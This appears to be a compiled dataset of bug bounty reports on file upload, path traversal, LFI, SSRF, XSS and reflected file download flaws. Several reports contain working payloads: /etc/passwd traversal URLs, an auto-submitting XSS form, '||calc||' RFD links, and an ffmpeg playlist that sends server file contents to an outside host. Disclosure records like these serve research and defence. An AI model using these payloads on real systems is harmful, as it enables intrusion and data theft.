@@ -1,0 +1,1409 @@
+===== FU-713 | Upload profile photo from URL | sev=None | bounty=None | substate=resolved | weak=Server-Side Request Forgery (SSRF) | len=311 | src=vulnerability_information
+Using this vulnerability users can upload images from any image URL. 
+Just change upload type using inspect element  (from "type=file" to "type=url") , paste URL in text field and hit enter or click on "Update Profile". Your profile photo will be changed to photo from URL.
+
+P.S  Im sorry for my bad english.
+===== FU-1092 | Directory Traversal | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-1675 | Local file inclusion | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-3370 | Directory traversal attack in view resolver | sev=None | bounty=None | substate=resolved | weak=Information Disclosure | len=1273 | src=vulnerability_information
+There seems to be two cases that allow directory traversal when using wildcard URL segments that allow rendering view outside view paths.
+
+For example, let say there is a route
+
+	get '/help/(*action)’, controller: ‘help’
+
+and a matching controller
+
+	class HelpController < ApplicationController
+	end
+
+This renders all views that are in 'app/views/help’ (assuming default view paths) even when matching action method is not defined.
+
+If an attacker made a request `GET /help/../../../Gemfile`, ActionView::FileSystemResolver returns Gemfile from project root as the matching view. This simple case can be prevented using Rack::Protection::PathTraversal middleware, but it is not enabled by default in Rails. Also, there could be other mechanisms that may result in rendering views that are outside view path. Not sure if that’s the expected behaviour, but this surprised me.
+
+However, Rack::Protection::PathTraversal can be bypassed using backslashes: `GET /help/%5c../%5c../%5c../Gemfile`. The resolver uses Dir.glob, which escapes backslashes unless File::FNM_NOESCAPE flag is used. Rack::Protection::PathTraversal won’t intercept `'\../'` and the resolver treats `'\../`' as `'../'`.
+
+Attached are fixes for the mentioned vulnerabilities with test cases.
+===== FU-4836 | From Unrestricted File Upload to Remote Command Execution | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-6674 | REMOTE CODE EXECUTION/LOCAL FILE INCLUSION/XSPA/SSRF, view-source:http://sb*.geo.sp1.yahoo.com/, 4/6/14, #SpringClean | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-7929 | Arbitrary file uploads to Amazon WS. | sev=None | bounty=None | substate=informative | weak=Violation of Secure Design Principles | len=1060 | src=vulnerability_information
+Hi,
+
+It seems one is able to upload arbitrary files to Amazon Webservices through the UI.
+
+This allows for uploading malware such as [msf-payload-x86.jpg.exe](https://hackerone-attachments.s3.amazonaws.com/production/000/006/741/bf60ba068e72e767b93d3fa35c89a36639dd1f19/msf-payload-x86.jpg.exe?AWSAccessKeyId=[REDACTED_AWS_KEY]&Expires=1397769394&Signature=aoXXsjuCqUjReIFLzMtXYyMO5us%3D) or whatever.
+
+Beyond free hosting this could potentially be used to entice teams into downloading stuff they probably don't want.
+
+Actual exploitation would likely depend on obfuscating the filename to look more innocent, general human errors, a certain trust in files being served from `hackerone-attachments.*.amazonaws.com` or separate issues entirely.
+
+I could imagine this to be working as intended but still believe it would be good to consider restrictions even if the result is to not enforce any.
+
+I would propose to at least consider displaying a warning similar to the (excellent) one displayed when visiting an external link.
+
+HTH,
+
+-leander
+===== FU-12388 | Multiple Upload Vulnerability !File Upload + File Inclusion (Access Not Forbidden) | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-14092 | Remote file Inclusion - RFI in upload | sev=None | bounty=None | substate=informative | weak=Code Injection | len=980 | src=vulnerability_information
+Hello,
+
+Everysite has a RFI vulnerability.
+Everysite i.e *.slack.com is having this vulnerability.
+
+Proof of concept / Steps to Reproduce :
+=================================
+
+1. Sign in to your account on slack eg. I signed in https://pran3hiva.slack.com
+2. Now, go to 'Change photo'. i.e https://pran3hiva.slack.com/account/photo
+3. Now, select file to upload.
+4. Click on upload image.
+5. You will be redirected to 'Crop Photo'.
+6. Note the url 
+eg.
+https://pran3hiva.slack.com/account/photo?url=https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fslack-files2%2Favatar-temp%2F2014-05-30%2F2364428212.jpg
+
+Note the 'url' parameter.
+
+7. Change it to desired.
+8. I changed it to --> https://pran3hiva.slack.com/account/photo?url=https://www.google.co.in/images/srpr/logo11w.png
+
+Now, image from site will be loaded.
+
+Hence, RFI :D
+I have attached 2 screen-shots. POC.
+Hope, you patch this one. :)
+
+If you have any questions you may ask me.
+
+Thank You,
+Pranav
+===== FU-18371 | Directory Traversal at http://staging.jsdelivr.net/ | sev=None | bounty=None | substate=resolved | weak=Command Injection - Generic | len=333 | src=vulnerability_information
+hi, 
+
+Directory Traversal is a vulnerability which allows attackers to access restricted directories and execute commands outside of the web server's root directory.
+
+POC: go this link ->  
+
+http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+===== FU-18851 | .NET Type Traversal Vulnerability CVE-2014-0257 | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-19532 | Missing "size check" on files to upload could make memory leaks. | sev=None | bounty=None | substate=resolved | weak=Memory Corruption - Generic | len=699 | src=vulnerability_information
+I noticed that there isn't any "size check" when someone tries to upload a flie through the "upload picture" option, this could generate a memory leak or also a kind of DoS and is deangerous with bigger and bigger files. So i first tried to upload a file of about 2,52 GB (see the pic) and no warning messaege about the size wasn't displayed (such as a 413 error message), and the site was unable to charge the page, it generated an huge solwdown of the connection to https://staging.uzbey.com. 
+
+------Risks------
+
+Someone interested could exploit that to make a designed wepay dosser software to take the website down and that colud also make a dangerous memory leak or exploitable overflows .
+===== FU-20616 | e.mail.ru: File upload "Chapito" circus | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-20720 | cloud.mail.ru: File upload XSS using Content-Type header | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-27704 | malicious file upload | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-31187 | Reflected XSS on www.bookfresh.com/index.html?view=upload_form | sev=None | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=1711 | src=vulnerability_information
+The issue is in the view _upload_form_.
+
+**Description**
+When you show an upload form in the site you use an URL like this: https://www.bookfresh.com/index.html?standalone=1&e=0c551a759eb62ba457d017569617eaa8&bk=FFFFFF&view=upload_form
+And you show the value of the parameter `bk` in the page: `<style>body{ background-color: #[VALUE_OF_BK]; }</style>`. 
+
+You have protection for XSS because you encode or remove tags like `<script>`, etc.
+But the problem is that you are only protecting the `GET` requests. So, if I do a `POST` request the value of `bk` is shown in the page without encoding or removing the tags.
+
+Another problem is that when the file https://www.bookfresh.com/index.html is loaded from the server there is not `X-Frame-Options` header set in the response. So, it will be more easy to exploit the vulnerability.
+
+**Steps to reproduce**:
+1. Create a HTML file with this content:
+
+        <form action="https://www.bookfresh.com/index.html" method="post">
+         <input type="hidden" name="bk" value="</style><script>alert(document.domain);</script><style>">
+         <input type="hidden" name="view" value="upload_form">
+        </form>
+        <script>
+         document.forms[0].submit();
+        </script>
+
+2. Create a HTML file with this content:
+
+        <iframe src="[path_of_the_file_from_step_1]"></iframe>
+
+3. Put the files on a server or run a test server on the localhost with something like: `php -S localhost:8000`
+4. Visit the file created in the step 2 and wait a few seconds.
+5. You will see an `alert()` with the domain of the frame: www.bookfresh.com.
+
+It works on the last version of Firefox and it doesn't work on the last version of Chrome.
+===== FU-39428 | Phabricator Phame Blog Skins Local File Inclusion | sev=None | bounty=500.0 | substate=resolved | weak=Code Injection | len=1882 | src=vulnerability_information
+Phabricator's Phame blog allows users to set a skin.
+
+An attacker with the ability to upload files to the server can exploit this LFI vulnerability to gain remote code execution through Phabricator and thus, gain access to Phabricator's data. Common scenarios may include:
+
+- A box serving Phabricator and other web application that would allow uploading files to controlled paths.
+- A box where the attacker can log in through ssh as a restricted user (not having access to Phabricator's files, but having access to write in /tmp, for instance)
+- etc ...
+
+While testing, I used the following request to create a blog:
+
+```
+POST /phame/blog/new/ HTTP/1.1
+Host: phabricator
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://phabricator.48bits.com/phame/blog/new/
+Cookie: phsid=o36kfovszv6sqpbjheacicu2ykx25lqoh5iepeit; phusr=guest
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 254
+
+__csrf__=B%40acbxwmgk39152b45fd9eff2e&__form__=1&name=xxxx&description=bla&can_view=users&can_edit=users&can_join=users&custom_domain=&skin=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%74%65%73%74
+```
+
+That makes phabricator try to load the skin template php files from:
+
+/var/www/phabricator/phabricator/externals/skins/../../../../../../../../../../tmp/test/
+
+In order to exploit the vulnerability a valid skin structure must exist at the specified location, I have simply copied the oblivious skin and modified it to output a phpinfo() within the header.php script with the expected results.
+
+Proposed fix:
+
+Phabricator should verify that the skin's path is not outside its own root.
+===== FU-39658 | Reflected File Download | sev=None | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=2549 | src=vulnerability_information
+**Info:**
+Reflected File Download is a new web attack vector. It allows an attacker to craft a malicious file and present it to a victim, but there is no file present at the server. It was recently published at the BlackHat Eupore 2014 by Oren Hafif. Link to his presentation is given at the end.
+
+**Pre-requisite:** To affect a user, he/she must be in a team with the attacker.
+
+The reason being that the flaw is connected to the `triggers` page which can only be accessed by team members. 
+
+**Preparing the injected file**
+1.) We first need to create a new `trigger`.  We have 3 fields: `Criteria`, `Action` and `Options`
+2.) In `Criteria` we have a text box called `text`. Populate it with the following content:
+* * *
+    text" || calc ||
+* * *
+3.) Fill the remaining boxes arbitrarily. Give any text. We have created a trigger.
+4.) If we go back to our triggers page we have an option to edit this particular trigger we created. The format is as follows:
+* * *
+    hackerone.com/<team_name>/triggers/<numeric_id>/edit
+* * *
+5.) Take this link, remove the `/edit` parameter.
+6.) Now if we access this link, we get a `404` saying something went wrong. But append `.bat` we will get a JSON response. Appending  `.` and any character will trigger a JSON response.
+
+Now we have a URL with a `.bat` extension. The JSON response contains `text" || calc ||` somewhere in the middle of this JSON response. Now if we take this JSON response and paste it in a Command Prompt it would open up a calculator. We need to present this as a file. To do this we craft a page as follows:
+* * *
+    <html>
+    <a href="https://hackerone.com/<team_name>/triggers/<numeric-id>.bat" download="anything.cmd">Click to view other user's bugs</a>
+    </html>
+* * *
+
+Now once the victim clicks on the link, he is presented with a file download box. The file is shown to be from `Hackerone` itself. Upon executing the file a calculator pops up. We have numerous payloads other than `calc`. They have been discussed in the White paper of RFD. 
+
+**Limitation:**
+The issue works in Google Chrome and IE. Firefox will not prompt for a download and instead show the JSON response. It is because it does not recognize the `download` parameter in the `href` attribute.
+
+**Reference:**
+* * *
+blog.spiderlabs.com/2014/10/reflected-file-download-the-white-paper.html
+* * *
+
+Here is a link to Youtube demonstrating the issue. The video is unlisted.
+* * *
+https://www.youtube.com/watch?v=b_neIFxJ_Wg&feature=youtu.be
+* * *
+
+Regards,
+Hysteria
+===== FU-43440 | Arbitrary file existence disclosure in Action Pack | sev=None | bounty=None | substate=resolved | weak=None | len=122 | src=vulnerability_information
+This bug was reported directly to the Rails team: https://groups.google.com/forum/#!topic/rubyonrails-security/23fiuwb1NBA
+===== FU-43850 | abusing Thumbnails(https://vimeo.com/upload/select_thumb) to see a private video | sev=None | bounty=None | substate=resolved | weak=Privilege Escalation | len=3103 | src=vulnerability_information
+https://vimeo.com/upload/select_thumb uri is used set a thumbnails on your vimeo video. https://vimeo.com/upload/select_thumb uri  request is compose of 3 parameter clip_id, token, and time . **clip_id parameter** is used to select a video you want to  get a thumbnail,clip_id is a csrf token and time parameter is the timeframe of the video you selected.!
+
+I changed the value of **clip_id** parameter to another video id to test some authorization flaw ,it seem it works because i got HTTP/1.1 200 OK  and i short json response that contain a url, like this one
+
+**{"success":true,"id":503302458,"url":"https:\/\/i.vimeocdn.com\/video\/503302458_100x75.jpg"}**
+
+To confirm this is a authorization flaw i make a another account and upload a private video in that account and get the clip_id, then make a request(https://vimeo.com/upload/select_thumb) to  my attacker account using that clip_id. as a result i got some thumbnails on a private video 
+
+if you want to get the whole video just iterate the time **parameter**! i think it is useful to include some request 
+
+
+
+**SOME REQUEST**
+
+POST /upload/select_thumb HTTP/1.1
+Host: vimeo.com
+Connection: keep-alive
+Content-Length: 101
+Accept: application/json
+Origin: https://vimeo.com
+X-Requested-With: XMLHttpRequest
+X-Request: JSON
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+Content-type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: https://vimeo.com/116730756/settings
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4
+Cookie: optimizelyEndUserId=oeu1421174571879r0.30598339810967445; vimeo_cart=%7B%22pro%22%3A%7B%22store%22%3A%22pro%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433857%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433857%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D%7D; ki_t=1421174596820%3B1421174596820%3B1421174632154%3B1%3B2; ki_r=; optimizelySegments=%7B%22198520930%22%3A%22direct%22%2C%22199004622%22%3A%22gc%22%2C%22199138489%22%3A%22false%22%2C%22213082152%22%3A%22none%22%2C%22222271074%22%3A%22true%22%7D; optimizelyBuckets=%7B%7D; language=en; clips=116730756%2C116213689; auto_load_stats=1; has_logged_in=1; stats_start_date=2015%2F01%2F11; stats_end_date=2015%2F01%2F15; site_settings=%7B%22sticky_page%22%3A%22%5C%2Fmyvideos%22%2C%22browse_format_vid%22%3A%22video%22%7D; stream_id=Y2xpcHM6MzYzNzIzODc6aWQ6ZGVzYzpbXQ%3D%3D; stream_pos=1; orphaned_upload_clip_ids_v2=%5B116730663%2C116730664%5D; vuid=971609171.1881657208; __utma=18302654.1379178336.1421173781.1421184208.1421253399.5; __utmb=18302654.28.9.1421253997197; __utmc=18302654; __utmz=18302654.1421174705.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1; vimeo=epk9krxkmr70pcdxcxxsctd7jpcdxcxmkxrx7%2Cpfftk0tftdd0fdcmvx9x92rmksckx5rrfww5dwrvv; player=""; xsrft=d816974227fe3684c41a8501f333679f.61b1f2e5e1df9aeb29e02acf641d99a9
+
+clip_id=**9digitid**&token=TOKEN_HERE&time=51.283
+===== FU-45368 | ftp upload of video allows naming that is not sanitized as the manual naming | sev=None | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=508 | src=vulnerability_information
+I have uploaded via ftp (Vimeo Pro account) a filename
+
+""><img src = x onerror=alert(2)>".mp4
+
+And as you can see in the screenshot it is put automatically as the name of the video. But I cannot put this name (""><img src = x onerror=alert(2)>".mp4) manually
+
+So I think it needs the same sanitization of the name as it's done after the manual editing.
+
+Even if the XSS is not reflected now (in this case) it can be when doing other actions involving the video name (sharing, follow, link, like etc)
+===== FU-50658 | Reflected File Download attack allows attacker to 'upload' executables to hackerone.com domain | sev=None | bounty=None | substate=resolved | weak=Command Injection - Generic | len=1325 | src=vulnerability_information
+Hi hackerone team,
+
+I'm a friend of Peiying and am looking for a position at hackerone. While playing around with your product, I found a serious vulnerability in your application: it allows attackers to craft executables on the hackerone.com domain rather than the sandboxed one on S3.
+
+1. attacker reports a bug titled `hackerone\"||calc||`
+2. attacker can then direct victim to [https://hackerone.com/notifications.bat](https://hackerone.com/notifications.bat)
+3. when downloaded and executed, it will open calculator on victim's windows environment
+
+The potentials of this vector is outlined in [Reflected File Download: A New Web Attack Vector](https://www.trustwave.com/Resources/SpiderLabs-Blog/Reflected-File-Download---A-New-Web-Attack-Vector/), which does not limit to executing commands on victim's machines.
+
+To fix, since hackerone is a Rails deployment, at the rendering step of the notifications action:
+
+instead of:
+
+`render json: notifications`
+
+do:
+
+    respond_to do |format|
+        format.json do
+            render json: notifications
+        end
+    end
+
+so requests of non-json formats would return a 406 Not Acceptable. see [respond_to](http://apidock.com/rails/ActionController/MimeResponds/InstanceMethods/respond_to).
+
+Look forward to hearing back from you soon,
+
+Ricky
+===== FU-51265 | Flash Cross Domain Policy Bypass by Using File Upload and Redirection - only in Chrome | sev=None | bounty=None | substate=resolved | weak=None | len=2187 | src=vulnerability_information
+CVE-2015-0337: https://helpx.adobe.com/security/products/flash-player/apsb15-05.html
++ 
+https://code.google.com/p/chromium/issues/detail?can=2&start=0&num=100&q=&groupby=&sort=&id=425280
+
+==VULNERABILITY DETAILS==
+It is possible to bypass Flash Cross Domain policy in Google Chrome to read other websites' contents after a user uploads a file to a destination that redirects the user to the target website. It is also possible to send a file upload request to a target website without checking the cross domain policy by using an open redirect with status code of 307 (or 308).
+This attack works as follows:
+1- The "FileReference" class provides a means to upload file to a target server in ActionScript.
+2- It accepts a URL as the destination for the file upload process.
+3- It also has access to the target website's contents via the "UPLOAD_COMPLETE_DATA" event. This event is dispatched after data is received from the server after a successful upload.
+4- If the target website redirects the user to another website, Flash in Google Chrome follows the redirection and discloses the destination content via the "UPLOAD_COMPLETE_DATA" event (first security issue). Moreover, if the target website redirects the user with status code of 307 (or 308), Google Chrome send the same file upload request to the final destination without checking the cross domain policy (second security issue).
+
+==REPRODUCTION CASE==
+A SWF PoC file and its ActionScript source has been attached.
+This SWF file can be hosted on any website to target other websites.
+http://attacker.com/chromeFileUploadCrossDomain.swf?url=redirect.php?input=https://plus.google.com/u/0/
+
+"redirect.php" is just a simple open redirect to the target URL. An example is as follows:
+http://attacker.com/chromeFileUploadCrossDomain.swf?url=http://0me.me/demo/openredirect/redirect.php?target=https://plus.google.com/u/0/%26status=301
+Note: "0me.me" has an open cross domain policy and that's why we did not need to host it on "attacker.com".
+
+An image has been attached that shows the result of exploiting this vulnerability. Source code of the "redirect.php" file has also been attached just for information.
+===== FU-52383 | unknow files Upload  in profile photo | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-59665 | Local File Inclusion Vulnerability in Concrete5 version 5.7.3.1 | sev=None | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=556 | src=vulnerability_information
+Concrete5 is vulnerable to a Local File Inclusion because it fails to properly validate the path for incoming requests during the dispatching process. This vulnerability exists because the path is retrieved using the Request::getPathInfo() method from the Symfony framework, which allows to specify the path for the request within some HTTP headers (like X-Original-URL and some others). However, this cannot be considered a vulnerability within the Symfony framework, but a vulnerability due to the way Concrete5 dispatches the request using that feature.
+===== FU-73480 | Arbritrary file Upload on AirMax | sev=None | bounty=None | substate=resolved | weak=Path Traversal | len=216 | src=summaries
+It's possible to upload arbitrary files to airMAX devices via HTTP because of a vulnerability in the airOS web server. 
+
+An attacker can bypass the device's authentication mechanisms by exploiting this vulnerability.
+===== FU-84374 | apps.owncloud.com: Malicious file upload leads to remote code execution | sev=None | bounty=None | substate=resolved | weak=Code Injection | len=236 | src=vulnerability_information
+Hello ownCloud Security Team,
+
+i am here to report a critical security vulnerability .
+
+Proof of concept :
+
+https://apps.owncloud.com/CONTENT/content-pre1/171172-1.php5
+
+code source of uploaded file : 
+<?php
+
+phpinfo();
+
+?>
+===== FU-97452 | Staff members with no permission can access to the files, uploaded by the administrator | sev=None | bounty=500.0 | substate=resolved | weak=Privilege Escalation | len=779 | src=vulnerability_information
+Staff members with no permission can access to the files, uploaded by the administrator
+
+### Test #1 
+If the member has access only to the section  Products, Inventory, & Collections
+1. Go to the Products -> Product Name -> Description
+2. Click the button -> Add Image
+3. In the section Uploaded images are all files uploded by the admin, so we can simply add them or download (screenshot attached)
+4. Uploded images are in the section Settings -> Files (but we don't have access there)
+
+### Test #2
+If the member has NO access to the ALL sections
+1. So we can not go to the page Products but....
+2. Lets go here https://*.myshopify.com/admin/rte/assets
+3. And we will see all files uploaded by admin (screenshot attached)
+4. On this page we can simply find links for admin files
+===== FU-97501 | SVG parser loads external resources on image upload | sev=None | bounty=None | substate=resolved | weak=Cross-Site Request Forgery (CSRF) | len=617 | src=vulnerability_information
+Uploading SVG that include
+
+```
+ <image xlink:href="http://example.com/?evil=var" />
+```
+
+will cause the server side parser to try to fetch external resources.
+
+I've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. 
+
+Also tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. 
+
+```
+Listening on [0.0.0.0] (family 0, port 3001)
+Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
+GET /?evil=var HTTP/1.0
+Host: 37.139.18.151:3001
+Accept-Encoding: gzip
+```
+===== FU-97657 | File upload XSS (Java applet) on http://slackatwork.com/ | sev=None | bounty=200.0 | substate=resolved | weak=Command Injection - Generic | len=1081 | src=vulnerability_information
+The web application supports file uploads and I was able to upload a Java Applet (.class/.jar) file. If a web browser loads a Java applet from a trusted site, the browser provides no security warning. If an attacker can upload a CLASS/JAR file with an applet, the file is executed even if the web page, which embeds the applet is located on a different site. An attacker could use a file upload function to build an XSS attack using active content.
+
+The impact of this vulnerability
+Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them. An attacker can steal the session cookie and take over the account, impersonating the user. It is also possible to modify the content of the page presented to the user.
+
+
+Here is the link of the file i was able to upload with class extension:-
+
+Successfully uploaded file Applet3863.class with content type image/jpeg.
+
+The file is available at: http://slackatwork.com/wp-content/uploads/job-manager-uploads/company_logo/2015/11/Applet3863.class.
+===== FU-97672 | File Upload XSS in image uploading of App in mopub | sev=None | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=1494 | src=vulnerability_information
+Hi Team,
+
+I want to report a File upload XSS in your Image upload functionality of Apps in mopub. Server doesn't check whether you are uploading a jpg/jpeg files and it upload the file on image.mopub.com .
+
+POC link : https://images.mopub.com/app_icons/126cb3308e1a464385a49c4c7aaeac56
+
+Steps to reproduce :
+1.Go to App settings and select a html file with .jpg extension.
+2.Intercept the request and change the .jpg to .html and change the content type to text/html and it will upload the file.
+3.Open the link of image in new file and XSS will pop up.
+
+HTTP request :
+
+POST /inventory/app_icon/upload/ HTTP/1.0
+Host: app.mopub.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRFToken: YZ8hbuu1vB9p5s1ni2vPZ5kMrhMqeDo5
+X-Requested-With: XMLHttpRequest
+Referer: https://app.mopub.com/inventory/app/97142808ce5d4ace895480a3ffe7d631/
+Content-Length: 389
+Content-Type: multipart/form-data; boundary=---------------------------1714461176134095862036612614
+Cookie: [Cookie values]
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+-----------------------------1714461176134095862036612614
+Content-Disposition: form-data; name="image_upload"; filename="xssfileuploadcopy.html"
+Content-Type: text/html
+
+HTML contetn
+-----------------------------1714461176134095862036612614--
+
+
+Let me know if you need any other help from my side.
+
+Best Regards !
+Vijay Kumar
+===== FU-105787 |  XXE in upload file feature | sev=high | bounty=None | substate=resolved | weak=Uncontrolled Resource Consumption | len=71 | src=summaries
+The attacker was able to execute XXE in one of the file upload feature.
+===== FU-107960 | Reflected File Download in community.ubnt.com/restapi/ | sev=None | bounty=None | substate=resolved | weak=None | len=1899 | src=vulnerability_information
+Hello,
+
+https://community.ubnt.com/restapi/vc/authentication/sessions/Ubiquiti_update.cmd?restapi.response_format=json&callback=\%22||calc||
+
+The above URL is vulnerable to RFD. Here is the proof of concept:
+
+Browser Chrome:
+
+* Embedded the above URL in html 5 anchor tags with download attribute:
+
+```
+<a href='https://community.ubnt.com/restapi/vc/authentication/sessions/Ubiquiti_update.cmd?restapi.response_format=json&callback=\%22||calc||' download='ubiquiti_update.cmd'>Download</a>
+```
+
+We can embedded this on any webpage and the moment user clicks on, it gets automatically download and when clicked can compromise the victim PC by executing any commands. (a calculator pops up in this case) 
+
+Browser **IE10/8**:
+
+* Give the URL directly in IE 10/8 and it directly download a file named `Ubiquiti_update.cmd`. The moment user clicks on the file, it executes and a calculator pops up.
+
+
+Browser Firefox:
+
+* Embedded the download link in such a way  that user has to do save link as option in firefox and downloads the file `ubiquiti_update.cmd`.
+
+```
+<a href='https://community.ubnt.com/restapi/vc/authentication/sessions/Ubiquiti_update.cmd?restapi.response_format=json&callback=\%22||calc||' download='ubiquiti_update.cmd' onclick="return false">Download</a>
+```
+
+I can give any commands inside the file as I want and inturn use this for a complete victim machine compromise. If victim checks where the download occurs, it will show as `community.ubnt.com`.
+
+References about this attack:
+
+http://www.paulosyibelo.com/2015/10/coinbase-reflected-file-download.html (RFD reported in coinbase)
+https://www.trustwave.com/Resources/SpiderLabs-Blog/Reflected-File-Download---A-New-Web-Attack-Vector/  (original research work)
+
+**Mitigation**:
+
+Callbacks should contain only alphabets and not special characters. All special characters much be stripped of before reflecting it in the response !
+===== FU-111269 | [ssrf] libav vulnerable during conversion of uploaded videos | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-114389 | Remote File Upload Vulnerability in business-blog.zomato.com | sev=None | bounty=None | substate=resolved | weak=Code Injection | len=380 | src=vulnerability_information
+hi
+
+https://business-blog.zomato.com installed an outdated MailPoet Plugin which vulnerable to Remote File Upload Vulnerability in WordPress MailPoet Plugin (wysija-newsletters) 
+
+related article: https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html
+
+https://business-blog.zomato.com/wp-content/plugins/wysija-newsletters/readme.txt
+===== FU-115857 | SSRF and local file read in video to gif converter | sev=None | bounty=None | substate=resolved | weak=None | len=1877 | src=vulnerability_information
+Video to gif converter on http://imgur.com/vidgif uses Lavf/55.48.100 with network options enabled. It makes possible SSRF by uploading specially crafted playlist. For example we can use mp4 file http://yngwie.ru/1.mp4
+```
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+http://yngwie.ru/2.mp4
+#EXT-X-ENDLIST
+```
+
+upload it by request
+
+```
+POST /vidgif/upload HTTP/1.1
+Host: imgur.com
+...
+
+source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12
+```
+
+and see second request from Lavf:
+```
+54.167.254.53 - - [11/Feb/2016:05:08:20 -0500] "GET /1.mp4 HTTP/1.1" 200 84 "http://yngwie.ru" "-" "-"
+54.82.61.224 - - [11/Feb/2016:05:08:20 -0500] "GET /2.mp4 HTTP/1.1" 404 169 "-" "Lavf/55.48.100" "-"
+```
+
+But this vulnerability not about only HTTP requests, it allows to read arbitrary files from server. Here is quick POC reading first line of /etc/passwd http://yngwie.ru/test.avi:
+```
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
+#EXT-X-ENDLIST
+```
+header.m3u8 (very important - without space before eof):
+```
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:,
+http://yngwie.ru?
+```
+concat proto https://www.ffmpeg.org/ffmpeg-protocols.html#concat will make valid playlist with first line of /etc/passwd in url:
+```
+54.82.61.224 - - [11/Feb/2016:04:55:32 -0500] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 400 173 "-" "-" "-"
+```
+
+it is possible to read full files by subfile proto https://www.ffmpeg.org/ffmpeg-protocols.html#subfile or by constructing 100% valid video files and extracting data from gifs.
+Sensitive files on server, some private apis, accessable from server, or some other allowed protocols which I didn't check may lead even to RCE.
+Links to original report about this issue:
+https://habrahabr.ru/company/mailru/blog/274855/ (russian)
+http://www.openwall.com/lists/oss-security/2016/01/14/1
+===== FU-116575 | Remote Code Execution (upload) | sev=None | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=228 | src=summaries
+Any file upload was accepted without filter, which led to RCE vulnerability.
+
+It was difficult to find the path tho :P 
+
+Strange thing : The shell was executing on firefox only :P , it displayed plain text when opened in chrome.
+===== FU-122475 | Local file read in image editor | sev=None | bounty=None | substate=resolved | weak=Code Injection | len=390 | src=summaries
+Filepaths were able to traverse up outside of their intended directory when using the /edit/process API endpoint. 
+
+Insufficient imageid filtration in image editor allowed an attacker to read arbitrary files. An attacker could read files by setting file path in imageid GET param in /edit/process API endpoint - http://imgur.com/edit/process?imageid=../../../../../../../../../../etc/passwd
+===== FU-126374 | Uploading Plain Text to uber-documents.s3.amazonaws.com Through the Driver Document Upload Page | sev=None | bounty=None | substate=informative | weak=Violation of Secure Design Principles | len=1247 | src=vulnerability_information
+Hi, 
+
+When a new driver is registering on Uber, they have to upload a variety of files (proof of insurance, ID, etc). When these files are being uploaded, Uber.com only checks whether the files have the correct extension. This means that one can upload a plain text file with a ```.png``` extension and it will be rendered as plain text when viewed in Internet Explorer. 
+
+At first I was attempting to get js execution with this (similar to how I did #126197), but that is not possible. When the file extension (```.png``` in our case) and the MIME type (```image/png```) match, Internet Explorer will not render it as HTML, it is only willing to render it as plain text. This still opens up a possibility of a fishing attach by doing something like this: 
+
+```
+https://uber-documents.s3.amazonaws.com/f7e83fb2-a309-4845-a038-8cb3846a0f0d.png?Signature=eQwYlK31HVRqaHN%2FdvaImVEDQuI%3D&Expires=1459110446&AWSAccessKeyId=[REDACTED_AWS_KEY]
+```
+
